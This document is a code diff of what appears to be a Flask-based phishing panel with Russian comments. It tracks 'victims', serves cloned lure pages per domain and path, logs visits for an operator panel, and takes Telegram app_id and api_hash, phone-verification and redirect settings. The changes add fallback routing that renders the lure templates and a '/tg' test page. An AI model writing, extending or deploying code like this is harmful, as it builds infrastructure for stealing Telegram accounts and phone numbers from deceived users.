@@ -47,27 +47,13 @@ def index():
     if host == server_domain:
         return redirect(url_for('panel'))
     else:
-
         try:
-            path = request.args.get('path')
+            path = request.args.get('path', None)
             url = host + '$' + path
             username = os.listdir(f'templates/domains/{url}/')[0]
-            db_username = username.replace(".html", "")
-
-
-
-            if not 'entered' in session:
-                session['entered'] = True
-                db_victim = Victim(f'./users/{db_username}/database.db')
-                db_victim.AddView(host)
-            else:
-                session.pop('entered')
-
-
-
             return render_template(f'domains/{url}/{username}')
         except Exception as e:
-            print(e)
+            print(session)
             domains = os.listdir(f'templates/domains/')
             for domain in domains:
                 if host in domain:
@@ -140,7 +126,15 @@ def login():
                 # Если нет сессии
                 return render_template('login.html')
     else:
-        return redirect(url_for('index', path=request.path.replace('/', '')))
+        try:
+            path = request.args.get('path', None)
+            url = domain + '$' + request.path.replace('/', '')
+            if path:
+                url = domain + '$' + path
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            return render_template(f'domains/{url}/{username}')
+        except:
+            return redirect(url_for('index', path=request.path.replace('/', '')))
     
 
 
@@ -180,7 +174,15 @@ def panel():
 
         return render_template('index.html', username=username, admin=admin, logs=logs)
     else:
-        return redirect(url_for('index', path=request.path.replace('/', '')))
+        try:
+            path = request.args.get('path', None)
+            url = domain + '$' + request.path.replace('/', '')
+            if path:
+                url = domain + '$' + path
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            return render_template(f'domains/{url}/{username}')
+        except:
+            return redirect(url_for('index', path=request.path.replace('/', '')))
     
 
 
@@ -303,7 +305,14 @@ def domains():
         domains = db_victim.GetDomains()
         return render_template('domains.html', domains=domains)
     else:
-        return redirect(url_for('index', path=request.path.replace('/', '')))
+        try:
+            path = request.args.get('path', None)
+            url = domain + '$' + path
+            username = os.listdir(f'templates/domains/{url}/')[0]
+            return render_template(f'domains/{url}/{username}')
+        except Exception as e:
+            print(e)
+            return redirect(url_for('index', path=request.path.replace('/', '')))
 
 
 
@@ -373,7 +382,6 @@ def edit_domain():
         security = request.form.get('security')
         app_id = request.form.get('app_id')
         api_hash = request.form.get('api_hash')
-
 
         if not countries or not page or not domain or not redirect or not path or not redirect_success or not security or not app_id or not api_hash:
             return jsonify({'status': 'error', 'message': 'Заполните полностью форму'})
@@ -496,6 +504,23 @@ def verify_phone():
 
     return jsonify({'status': 'error', 'phone': phone, 'domain': domain})
     
+
+
+
+
+
+
+
+###########################################
+#                                         #
+#               Тестирование              #
+#                                         #
+###########################################
+@app.route('/tg', methods=['POST', 'GET'])
+def tg():
+    return render_template('domains/jojo.html')
+
+
 
 
 
